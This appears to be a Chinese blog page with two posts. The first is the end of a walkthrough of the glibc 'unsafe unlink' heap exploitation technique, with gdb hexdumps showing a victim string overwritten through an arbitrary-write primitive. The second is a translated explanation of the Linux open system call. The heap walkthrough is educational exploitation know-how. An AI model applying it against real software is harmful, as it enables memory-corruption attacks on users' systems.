<li>gdb + gef</li>
<li>libc 2.24</li>
</ul>
<p>连续申请两个堆后,第一个堆的mem ptr = 0x8403220，第二个堆的 mem ptr = 0x84032b0</p>
<p>第一个堆地址存储在 chunk0_ptr 中，&amp;chunk0_ptr = 0x8202050</p>
<p>查看 0x8202038~0x8202050 存储的内容：</p>
<table>
<thead>
<tr>
<th>Addr</th>
<th style="text-align:center">Offset</th>
<th style="text-align:center">Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x8202038</td>
<td style="text-align:center">0x0</td>
<td style="text-align:center">0x0</td>
</tr>
<tr>
<td>0x8202040</td>
<td style="text-align:center">0x8</td>
<td style="text-align:center">0x8202040</td>
</tr>
<tr>
<td>0x8202048</td>
<td style="text-align:center">0x10</td>
<td style="text-align:center">0x0</td>
</tr>
<tr>
<td>0x8202050</td>
<td style="text-align:center">0x18</td>
<td style="text-align:center">0x8403220</td>
</tr>
</tbody>
</table>
<p>查看第一个堆的状态：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  hexdump qword <span class="number">0x8403210</span> L5</span><br><span class="line"><span class="number">0x8403210</span>+<span class="number">0000</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403218</span>+<span class="number">0008</span>   │ <span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x8403220</span>+<span class="number">0010</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403228</span>+<span class="number">0018</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403230</span>+<span class="number">0020</span>   │ <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
<p>fake chunk 后第一个堆的状态：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  hexdump qword <span class="number">0x8403210</span> L8</span><br><span class="line"><span class="number">0x8403210</span>+<span class="number">0000</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403218</span>+<span class="number">0008</span>   │ <span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x8403220</span>+<span class="number">0010</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403228</span>+<span class="number">0018</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403230</span>+<span class="number">0020</span>   │ <span class="number">0x0000000008202038</span></span><br><span class="line"><span class="number">0x8403238</span>+<span class="number">0028</span>   │ <span class="number">0x0000000008202040</span></span><br><span class="line"><span class="number">0x8403240</span>+<span class="number">0030</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403248</span>+<span class="number">0038</span>   │ <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
<p>free 第二个 chunk 后 chunk0_ptr 存储的内容变了：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gef➤  hexdump qword <span class="number">0x8403210</span> L8</span><br><span class="line"><span class="number">0x8403210</span>+<span class="number">0000</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403218</span>+<span class="number">0008</span>   │ <span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x8403220</span>+<span class="number">0010</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403228</span>+<span class="number">0018</span>   │ <span class="number">0x0000000000020de1</span></span><br><span class="line"><span class="number">0x8403230</span>+<span class="number">0020</span>   │ <span class="number">0x0000000008202038</span></span><br><span class="line"><span class="number">0x8403238</span>+<span class="number">0028</span>   │ <span class="number">0x0000000008202040</span></span><br><span class="line"><span class="number">0x8403240</span>+<span class="number">0030</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8403248</span>+<span class="number">0038</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line">gef➤  hexdump qword <span class="number">0x8202038</span> L6</span><br><span class="line"><span class="number">0x8202038</span>+<span class="number">0000</span> &lt;data_start+<span class="number">0000</span>&gt;  │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8202040</span>+<span class="number">0008</span> &lt;__dso_handle+<span class="number">0000</span>&gt;  │ <span class="number">0x0000000008202040</span></span><br><span class="line"><span class="number">0x8202048</span>+<span class="number">0010</span> &lt;completed+<span class="number">0000</span>&gt;  │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8202050</span>+<span class="number">0018</span> &lt;chunk0_ptr+<span class="number">0000</span>&gt;  │ <span class="number">0x0000000008202038</span></span><br><span class="line"><span class="number">0x8202058</span>+<span class="number">0020</span>   │ <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8202060</span>+<span class="number">0028</span>   │ <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
<p>即满足条件绕过 unlink 链表 check 。</p>
<h1><span id="unsafe-unlink-实现任意地址写数据分析">unsafe unlink 实现任意地址写数据分析</span></h1><p>基于以上的分析，此时 chunk0_ptr 存储的是 0x8202038 这个地址，也就是说此时第一个堆的 mem ptr 不再是 0x8403220，而是 0x8202038</p>
<p>现在向第一个堆写入数据，其实就是往 0x8202038 这个地址写入数据，但是如果可以换掉这个地址，那么就可以往任意地址写任意数据了。效果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; n</span><br><span class="line"><span class="comment">//chunk0_ptr[3] = (uint64_t) victim_string;</span></span><br><span class="line"><span class="comment">//chunk0_ptr is now pointing where we want, we use it to overwrite our victim string</span></span><br><span class="line">gef&gt; hexdump qword <span class="number">0x8202038</span> L10</span><br><span class="line"><span class="number">0x8202038</span>+<span class="number">0000</span> &lt;data_start+<span class="number">0000</span>&gt; | <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8202040</span>+<span class="number">0008</span> &lt;__dso_handle+<span class="number">0000</span>&gt; | <span class="number">0x0000000008202040</span></span><br><span class="line"><span class="number">0x8202048</span>+<span class="number">0010</span> &lt;completed+<span class="number">0000</span>&gt; | <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8202050</span>+<span class="number">0018</span> &lt;chunk0_ptr+<span class="number">0000</span>&gt; | <span class="number">0x00007ffffffee200</span></span><br><span class="line"><span class="number">0x8202058</span>+<span class="number">0020</span> | <span class="number">0x0000000000000000</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">gef&gt; n</span><br><span class="line">Original value: Hello!~</span><br><span class="line">New Value: BBBBAAAA2@</span><br></pre></td></tr></table></figure>
<h1><span id="reference">Reference：</span></h1><ul>
<li><a href="http://drops.xmd5.com/static/drops/tips-7326.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/tips-7326.html</a></li>
<li><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c</a></li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/10/20/[Translation]how-open-syscall-implement/" itemprop="url">
                  译 - open 系统调用的实现
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2018-10-20T16:50:00+08:00" content="2018-10-20">
              2018-10-20
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index">
                    <span itemprop="name">Linux</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2018/10/20/[Translation]how-open-syscall-implement/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/10/20/[Translation]how-open-syscall-implement/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>最近参与了一个开源项目，Linux 内核揭秘：<a href="https://github.com/MintCN/linux-insides-zh" target="_blank" rel="external">https://github.com/MintCN/linux-insides-zh</a>。本文是其中的一篇关于 open 系统调用的实现的翻译。</p>
<h2><span id="open-系统调用实现"><code>open</code> 系统调用实现</span></h2><h2><span id="导论">导论</span></h2><p>本节是详述 Linux 内核中的 <a href="https://en.wikipedia.org/wiki/System_call" target="_blank" rel="external">系统调用</a> 机制章节的第五部分。之前的内容部分概述了这个机制，现在我将试着详细讲解 Linux 内核中不同系统调用的实现。本章之前的部分和本书其他章节描述的 Linux 内核机制大部分对用户空间是隐约可见或完全不可见。但是 Linux 内核代码不仅仅是有关内核的。大量的内核代码为我们的应用代码提供了支持。通过 Linux 内核，我们的程序可以在不知道 sector,tracks 和磁盘的其他结构的情况下对文件进行读写操作，我们也不需要手动去构造和封装网络数据包就可以通过网络发送数据。</p>
<p>你觉得怎么样，我认为这些非常有趣耶，操作系统如何工作，我们的软件如何与（系统）交互呢。你或许了解，我们的程序通过特定的机制和内核进行交互，这个机制就是<a href="https://en.wikipedia.org/wiki/System_call" target="_blank" rel="external">系统调用</a>。因此，我决定去写一些系统调用的实现及其行为，比如我们每天会用到的 <code>read</code>,<code>write</code>,<code>open</code>,<code>close</code>,<code>dup</code> 等等。</p>
<p>我决定从 <a href="http://man7.org/linux/man-pages/man2/open.2.html" target="_blank" rel="external">open</a> 系统调用开始。如果你对 C 程序有了解，你应该知道在我们能对一个文件进行读写或执行其他操作前，我们需要使用 <code>open</code> 函数打开这个文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">"test"</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> fd &lt; <span class="number">0</span> &#123;</span><br><span class="line">                perror(<span class="string">"Opening of the file is failed\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"file sucessfully opened\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        close(fd); </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这样的情况下，<code>open</code> 仅是来自标准库中的函数，而不是系统调用。标准库将为我们调用相关的系统调用。<code>open</code> 调用将返回一个 <a href="https://en.wikipedia.org/wiki/File_descriptor" target="_blank" rel="external">文件描述符</a>。这个文件描述符仅是一个独一无二的数值，在我们的程序里和被打开的文件息息相关。现在我们使用 <code>open</code> 调用打开了一个文件并且得到了文件描述符，我们可以和这个文件开始交互了。我们可以写入，读取等等操作。程序中已打开的文件列表可通过 <a href="https://en.wikipedia.org/wiki/Procfs" target="_blank" rel="external">proc</a> 文件系统获取：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ls /proc/1/fd/</span><br><span class="line"></span><br><span class="line">0  10  12  14  16  2   21  23  25  27  29  30  32  34  36  38  4   41  43  45  47  49  50  53  55  58  6   61  63  67  8</span><br><span class="line">1  11  13  15  19  20  22  24  26  28  3   31  33  35  37  39  40  42  44  46  48  5   51  54  57  59  60  62  65  7   9</span><br></pre></td></tr></table></figure>
<p>我并不打算在这篇文章中以用户空间的视角来描述更多 <code>open</code> 例程细节，会更多地从内核的角度来分析。如果你不是很熟悉 <code>open</code> 函数，你可以在 <a href="http://man7.org/linux/man-pages/man2/open.2.html" target="_blank" rel="external">man 手册</a>获取更多信息。</p>
<p>开始吧！</p>
<h2><span id="open-系统调用的定义"><code>open</code> 系统调用的定义</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(open, <span class="keyword">const</span> <span class="keyword">char</span> __user *, filename, <span class="keyword">int</span>, flags, <span class="keyword">umode_t</span>, mode)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (force_o_largefile())</span><br><span class="line">		flags |= O_LARGEFILE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> do_sys_open(AT_FDCWD, filename, flags, mode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果你阅读过<a href="https://xinqiu.gitbooks.io/linux-insides-cn/content/SysCall/linux-syscall-4.html" target="_blank" rel="external">上一节</a>，你应该知道系统调用通过 <code>SYSCALL_DEFINE</code> 宏定义实现。因此，<code>open</code> 系统调用也不例外。</p>
<p><code>open</code> 系统调用位于 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/open.c" target="_blank" rel="external">fs/open.c</a> 源文件中，粗看非常简短</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(open, <span class="keyword">const</span> <span class="keyword">char</span> __user *, filename, <span class="keyword">int</span>, flags, <span class="keyword">umode_t</span>, mode)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (force_o_largefile())</span><br><span class="line">		flags |= O_LARGEFILE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> do_sys_open(AT_FDCWD, filename, flags, mode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>你或许已经猜到了，同一个<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/open.c" target="_blank" rel="external">源文件</a>中的 <code>do_sys_open</code> 函数才是主要的。但是在进入这个函数被调用前，我们来看看 <code>open</code> 系统调用定义的实现代码中 <code>if</code> 分支语句</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (force_o_largefile())</span><br><span class="line">	flags |= O_LARGEFILE;</span><br></pre></td></tr></table></figure>
<p>这里可以看到如果 <code>force_o_largefile()</code> 返回 true，传递给 <code>open</code> 系统调用的 flags 参数会加上了 <code>O_LARGEFILE</code> 标志。<code>O_LARGEFILE</code> 是什么？阅读 <code>open(2)</code> <a href="http://man7.org/linux/man-pages/man2/open.2.html" target="_blank" rel="external">man 手册</a> 可以了解到：</p>
<blockquote>
<p>O_LARGEFILE</p>
<p>(LFS) Allow files whose sizes cannot be represented in an off_t (but can be represented in an off64_t) to be opened.</p>
</blockquote>
<p>在 <a href="https://www.gnu.org/software/libc/manual/html_mono/libc.html#File-Position-Primitive" target="_blank" rel="external">GNU C 标准库参考手册</a>中可以获取更多信息：</p>
<blockquote>
<p>off_t</p>
<p>   This is a signed integer type used to represent file sizes.<br>   In the GNU C Library, this type is no narrower than int.<br>   If the source is compiled with _FILE_OFFSET_BITS == 64 this<br>   type is transparently replaced by off64_t.</p>
</blockquote>
<p>和</p>
<blockquote>
<p>off64_t</p>
<p>   This type is used similar to off_t. The difference is that<br>   even on 32 bit machines, where the off_t type would have 32 bits,<br>   off64_t has 64 bits and so is able to address files up to 2^63 bytes<br>   in length. When compiling with _FILE_OFFSET_BITS == 64 this type<br>   is available under the name off_t.</p>
</blockquote>
<p>因此不难猜到 <code>off_t</code>,<code>off64_t</code> 和 <code>O_LARGEFILE</code> 是关于文件大小的。就 Linux 内核而言，在32 位系统中打开大文件时如果调用者没有加上 <code>O_LARGEFILE</code> 标志，打开大文件的操作就会被禁止。在 64 位系统上，我们在 <code>open</code> 系统调用时强制加上了这个标志。<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/include/linux/fcntl.h#L7" target="_blank" rel="external">include/linux/fcntl.h</a> linux 内核头文件中详述了 <code>force_o_largefile</code> 宏：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> force_o_largefile</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> force_o_largefile() (BITS_PER_LONG != 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>这个宏因 CPU 架构有所不同，但在我们当前的情况即 <a href="https://en.wikipedia.org/wiki/X86-64" target="_blank" rel="external">x86_64</a> 下，没有提供 <code>force_o_largefile</code> 宏的定义，但这个宏在 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/include/linux/fcntl.h#L7" target="_blank" rel="external">include/linux/fcntl.h</a>出现了。</p>
<p>因此，正如我们当前了解的， <code>force_o_largefile</code> 在我们当前的 <a href="https://en.wikipedia.org/wiki/X86-64" target="_blank" rel="external">x86_64</a> 架构下就是一个展开为 “true” 值的宏。因此我们正考虑的是 64 位的情况，因此 <code>force_o_largefile</code> 将展开为 true 并且 <code>O_LARGEFILE</code> 标志将被添加到 <code>open</code> 系统调用的 flags 参数中。</p>
<p>现在我们了解 <code>O_LARGEFILE</code> 标志和 <code>force_o_largefile</code> 宏的意义，我们可以继续讨论 <code>do_sys_open</code> 函数的实现。正如我之前所写的，这个函数被定义在<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/open.c" target="_blank" rel="external">同一个源文件</a>中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">do_sys_open</span><span class="params">(<span class="keyword">int</span> dfd, <span class="keyword">const</span> <span class="keyword">char</span> __user *filename, <span class="keyword">int</span> flags, <span class="keyword">umode_t</span> mode)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> open_flags op;</span><br><span class="line">	<span class="keyword">int</span> fd = build_open_flags(flags, mode, &amp;op);</span><br><span class="line">	<span class="keyword">struct</span> filename *tmp;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fd)</span><br><span class="line">		<span class="keyword">return</span> fd;</span><br><span class="line"></span><br><span class="line">	tmp = getname(filename);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(tmp))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(tmp);</span><br><span class="line"></span><br><span class="line">	fd = get_unused_fd_flags(flags);</span><br><span class="line">	<span class="keyword">if</span> (fd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">struct</span> file *f = do_filp_open(dfd, tmp, &amp;op);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(f)) &#123;</span><br><span class="line">			put_unused_fd(fd);</span><br><span class="line">			fd = PTR_ERR(f);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			fsnotify_open(f);</span><br><span class="line">			fd_install(fd, f);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	putname(tmp);</span><br><span class="line">	<span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>让我们试着一步一步理解 <code>do_sys_open</code> 如何工作。</p>
<h2><span id="open2-flags-参数">open(2) flags 参数</span></h2><p>现在你已经知道 <code>open</code> 系统调用通过设置第二个参数 flags 来控制打开一个文件并且第三个参数 <code>mode</code> 规定创建文件的权限。<code>do_sys_open</code> 函数开头调用了 <code>build_open_flags</code> 函数，这个函数检查给定的 flags 参数是否有效，并处理不同的 flags 和 mode 条件。</p>
<p>让我们看看 <code>build_open_flags</code> 的实现，这个函数被定义在<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/open.c" target="_blank" rel="external">同一个内核文件</a>并且需要三个参数：</p>
<ul>
<li>flags - 控制打开一个文件</li>
<li>mode - 新建文件的权限</li>
</ul>
<p>最后一个参数 - <code>op</code> 在 <code>open_flags</code> 结构体中表示如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> open_flags &#123;</span><br><span class="line">        <span class="keyword">int</span> open_flag;</span><br><span class="line">        <span class="keyword">umode_t</span> mode;</span><br><span class="line">        <span class="keyword">int</span> acc_mode;</span><br><span class="line">        <span class="keyword">int</span> intent;</span><br><span class="line">        <span class="keyword">int</span> lookup_flags;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这个结构体定义在 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/internal.h#L99" target="_blank" rel="external">fs/internal.h</a> 头文件中并且我们可以看到这个结构体保存了给内核的 flags 和 权限模式信息，你或许已经猜到了 <code>build_open_flags</code> 函数的主要目的就是生成一个 <code>open_flags</code> 结构体实例。</p>
<p><code>build_open_flags</code> 函数的实现里定义了一系列局部变量，其中一个是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> acc_mode = ACC_MODE(flags);</span><br></pre></td></tr></table></figure>
<p>这个局部变量表示权限模式，它的初始值会等于 <code>ACC_MODE</code> 宏展开的值，这个宏定义在 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/include/linux/fs.h" target="_blank" rel="external">include/linux/fs.h</a>,看起来非常有趣：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ACC_MODE(x) (<span class="string">"\004\002\006\006"</span>[(x)&amp;O_ACCMODE])</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_ACCMODE   00000003</span></span><br></pre></td></tr></table></figure>
<p><code>&quot;\004\002\006\006&quot;</code> 是一个四字符的数组：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\004\002\006\006&quot; == &#123;&apos;\004&apos;, &apos;\002&apos;, &apos;\006&apos;, &apos;\006&apos;&#125;</span><br></pre></td></tr></table></figure></p>
<p>因此，<code>ACC_MODE</code> 宏就是通过 <code>[(x) &amp; O_ACCMODE]</code> 索引展开这个数组里的值。我们可以看到，<code>O_ACCMODE</code> == 00000003.通进行 <code>x &amp; O_ACCMODE</code>，我们拿最后两个重要的位来表示 <code>read</code>,<code>write</code> 或 <code>read/weite</code> 权限：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_RDONLY        00000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_WRONLY        00000001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_RDWR          00000002</span></span><br></pre></td></tr></table></figure>
<p>再从数组中计算索引得到值后，<code>ACC_MODE</code> 会展开一个文件的权限标志，包含 <code>MAY_WRITE</code>,<code>MAY_READ</code> 和其他信息。</p>
<p>在我们计算得到初始权限模式后，我们会看到以下条件判断语句：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; (O_CREAT | __O_TMPFILE))</span><br><span class="line">	op-&gt;mode = (mode &amp; S_IALLUGO) | S_IFREG;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	op-&gt;mode = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p>
<p>如果一个被打开的文件不是临时文件并且不是以新建文件方式打开的，我们可以在 <code>open_flags</code> 实例中重置模式。这是因为：</p>
<blockquote>
<p>if  neither O_CREAT nor O_TMPFILE is specified, then mode is ignored.</p>
</blockquote>
<p>在其他情况下，如果 <code>O_CREAT</code> 和 <code>O_TMPFILE</code> 标志被传递，我们可以把这个转换为一个规则文件因为 <code>opendir</code>(<a href="http://man7.org/linux/man-pages/man3/opendir.3.html" target="_blank" rel="external">http://man7.org/linux/man-pages/man3/opendir.3.html</a>) 系统调用会创建一个目录。</p>
<p>在接下来的步骤，我们检查一个文件是否被 <a href="http://man7.org/linux/man-pages/man7/fanotify.7.html" target="_blank" rel="external">fanotify</a>打开过并且没有 <code>O_CLOSEXEC</code> 标志：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flags &amp;= ~FMODE_NONOTIFY &amp; ~O_CLOEXEC;</span><br></pre></td></tr></table></figure>
